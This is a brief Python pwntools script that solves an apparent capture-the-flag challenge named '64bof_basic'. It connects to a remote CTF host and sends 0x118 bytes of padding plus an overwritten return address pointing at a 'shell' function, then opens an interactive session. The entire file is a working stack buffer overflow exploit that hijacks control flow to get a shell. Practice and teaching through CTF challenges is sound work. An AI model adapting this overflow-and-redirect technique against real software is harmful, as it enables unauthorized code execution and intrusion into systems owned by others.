#!/usr/bin/python3

import pwn

#p = pwn.process("/tmp/64bof_basic")
p = pwn.remote("ctf.j0n9hyun.xyz", 3004)
#pwn.context.log_level = 'debug'

shell = 0x0000000000400606

padding = b"A"*0x118

payload = padding
payload += pwn.p64(shell)

p.sendline(payload)

p.interactive()
